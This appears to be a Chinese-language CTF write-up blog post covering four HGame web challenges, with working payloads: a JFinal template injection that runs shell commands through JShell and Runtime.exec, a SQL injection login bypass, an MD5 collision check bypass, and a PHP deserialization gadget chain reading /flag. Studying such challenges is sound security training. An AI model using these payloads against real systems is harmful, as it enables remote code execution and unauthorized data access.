---
title: HGame Mini Writeup
date: 2024-09-20 01:42:13
categories:
    - "CTF"
tags: 
    - "hgame"
---

## Enjoy Coffee

本题是一个Jar文件，使用了JFinal的模版引擎，逆向后render代码如下

```java
public class indexController {
  @RequestMapping({"/"})
  public String Index() {
    return "Try to use Enjoy Template Engine.";
  }
  
  @RequestMapping({"/render"})
  public String read(@RequestParam String tmpl) {
    try {
      Engine engine = Engine.use();
      engine.setStaticMethodExpression(true);
      Template template = engine.getTemplateByString(tmpl);
      return template.renderToString();
    } catch (Exception e) {
      return e.toString();
    } 
  }
}
```

<!-- more -->

看到一个`setStaticMethodExpression(true)`，提示我们使用静态方法，然后看到了一个同样是[JFinal的CTF题](https://pankas.top/2023/11/13/2023浙江省赛决赛web-wp/)，得知构造`JShell`然后再通过`getRuntime().exec()`来执行`Shell命令`的方法。~~通过ChatGPT~~，构造出如下字符串~~(其实题目改之前我就知道`flag`在根目录下😈)~~：

`#((jdk.jshell.JShell::create()).eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ls /").getInputStream()).useDelimiter("\\A").next()'))`

获取到如下输出：

`[SnippetEvent(snippet=Snippet:VariableKey($1)#1-new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ls /").getInputStream()).useDelimiter("\\A").next(),previousStatus=NONEXISTENT,status=VALID,isSignatureChange=true,causeSnippetnullvalue="app\nbF14g_asg7f8as9\nbash\nbin\nboot\ndev\netc\nflag\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nreadflag\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n")]`

可以看到根目录下有`bF14g_asg7f8as9`，`readflag`，`flag`，这几个奇怪🤔的文件，修改命令，一个个`cat`过去。
最终在`bF14g_asg7f8as9`中获取到了`flag`🎊。

## Vidar Mail

题目下载一看，在`login`函数下看到了喜闻乐见的`sql注入`，可注入的语句如下

```go
query := "SELECT username FROM users WHERE username = '" + user.Username + "' AND password = '" + user.Password + "'"
```

然后目光来到`flagchecker`函数内，貌似需要满足一定的条件（用户为`admin`，发的邮件内容为`where is my flag`，收件人为`flagholder`）才能获取到`flag`

```go
query := "SELECT id FROM emails WHERE sender = 'admin' AND body = 'where is my flag' AND receivers ='flagholder'"
```

于是开始通过注入登陆`admin`账号，密码为`' or '1'='1`。登入后开始发送邮件。
![vidarmail1](vidarmail1.png)

然后打开`/check`页面，获取到了`flag`🎊。
![vidarmail2](vidarmail2.png)

## My Notebook

打开之后用开发者工具看一下，把网页源码藏在了`/www.zip`下。看到如下登陆代码：
![mynotebook1](mynotebook1.png)

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    if (!isset($_POST['check-code-1']) || !isset($_POST['check-code-2'])){
        return;
    }
    if ($_POST['check-code-1'] == $_POST['check-code-2']){
        die("<script>alert('The checkcodes cannot be equalled or empty!')</script>");
    }
    if (md5($_POST['check-code-1']) == md5($_POST['check-code-2'])){
        $_SESSION['username'] = 'admin';
        $_SESSION['session_id'] = md5(stringToRandom(16));
        header("Location:index.php");
    }else{
        die("<script>alert('The md5 of two checkcodes should be equalled!')</script>");
    }
}
```

告诉我们通过`POST`请求，并且两个`code`要不一样，但是`md5`一样，网上随便找个`md5`碰撞的字符串：`s878926199a`和`s155964671a`。
然后看到一个`save.php`和`get.php`用来存储和读取数据的，但是读取的时候有如下语句：

```php
if (is_serialized($total[$i])) {
    unserialize($total[$i]);
}
```

会将存储的数据`unserialize`，这就给了我们执行代码的机会。在`mainclass`中有许多奇怪的类：

```php
<?php
class HereWeGo{
    public $try;
    public function __destruct(){
        $this->try->gogogo();
    }
}

class GoGoGo{
    public $go;

    public function __construct($go)
    {
        $this->go = $go;
    }

    public function __call($name,$arguments){
        return $this->go->web;
    }
}

class Evil{
    public $file;
    public $final;

    public function __construct($file){
        $this->file = $file;
    }
    //The flag is in /flag
    public function __get($Attribute){
        $result = file_get_contents($this->file);
        if(preg_match('/vidar/i',$result)){
            $this->final = "HACKER!!!";
            file_put_contents('flag.txt',$this->final);
            return;
        }
        $this->final = $result;
        file_put_contents('flag.txt',$this->final);
    }
}
```

`HereWeGo`类会在解构的时候执行`try`中的`gogogo`方法，而`GoGoGo`类不管调用什么，都会返回`go`中的`web`成员。而`Evil`类在获取成员时会读取`file`，但是其中有一个正则过滤，导致我们无法直接读取`flag`，但是我们可以使用`php`内置的`php://filter/read=convert.base64-encode/resource=/flag`来将`flag`以`base64`的形式输出。
构造以下代码：

```php
$evil = new Evil("php://filter/read=convert.base64-encode/resource=/flag");

// 创建 GoGoGo 对象，传入 Evil 对象
$gogogo = new GoGoGo($evil);

// 创建 HereWeGo 对象，传入 GoGoGo 对象
$herewego = new HereWeGo();
$herewego->try = $gogogo;

// 序列化 HereWeGo 对象
$serialized = serialize($herewego);
echo $serialized;
```

最终获取到了`flag`。
![mynotebook2](mynotebook2.png)

## Go AHead

是`gin`中的模板注入。看到程序往`Request`中加了`flag`，构造模板读取`Request`：`{{.Request}}`。输出：

```plain
{GET /?tmpl=%7B%7B.Request%7D%7D HTTP/1.1 1 1 map[Accept:[*/*] Accept-Encoding:[gzip, deflate, br] Postman-Token:[d1aae680-4970-4078-9819-c9d5d03df0fe] User-Agent:[PostmanRuntime/7.41.2] Yourgift:[VIDAR{555bd130523df71e332784955363a940f36bc2e8}
]] {} <nil> 0 [] false 182.202.178.28:32664 map[] map[] <nil> map[] 10.88.0.1:41768 /?tmpl=%7B%7B.Request%7D%7D <nil> <nil> <nil> 0xc00007c3c0 <nil> [] map[]}
```

直接获取到`flag`。
